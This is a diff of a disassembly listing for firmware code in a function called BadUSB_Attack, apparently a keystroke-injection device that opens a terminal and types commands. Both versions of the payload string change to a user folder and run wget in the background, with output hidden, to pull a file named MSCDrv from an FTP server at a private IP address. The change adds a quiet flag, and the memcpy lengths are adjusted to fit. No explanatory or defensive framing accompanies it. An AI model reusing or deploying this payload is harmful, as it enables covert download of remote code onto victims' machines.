@@ -1371,10 +1371,10 @@ void BadUSB_Attack(int stage){
  8000b60:	4a32      	ldr	r2, [pc, #200]	; (8000c2c <BadUSB_Attack+0x100>)
  8000b62:	4618      	mov	r0, r3
  8000b64:	4611      	mov	r1, r2
- 8000b66:	235d      	movs	r3, #93	; 0x5d
+ 8000b66:	235f      	movs	r3, #95	; 0x5f
  8000b68:	461a      	mov	r2, r3
  8000b6a:	f00c fa8d 	bl	800d088 <memcpy>
-				"cd /home/user/Templates\nwget ftp://anonymous:@192.168.59.207/MSCDrv > /dev/null 2>&1 &\nexit\n");
+				"cd /home/user/Templates\nwget -q ftp://anonymous:@192.168.59.207/MSCDrv >/dev/null 2>&1 &\nexit\n");
 		SimulateShortcutKey(Terminal, 3);
  8000b6e:	f507 7386 	add.w	r3, r7, #268	; 0x10c
  8000b72:	2103      	movs	r1, #3
@@ -1417,7 +1417,7 @@ void BadUSB_Attack(int stage){
  8000bba:	4a1e      	ldr	r2, [pc, #120]	; (8000c34 <BadUSB_Attack+0x108>)
  8000bbc:	4618      	mov	r0, r3
  8000bbe:	4611      	mov	r1, r2
- 8000bc0:	234b      	movs	r3, #75	; 0x4b
+ 8000bc0:	234a      	movs	r3, #74	; 0x4a
  8000bc2:	461a      	mov	r2, r3
  8000bc4:	f00c fa60 	bl	800d088 <memcpy>
 		SimulateShortcutKey(Terminal, 3);
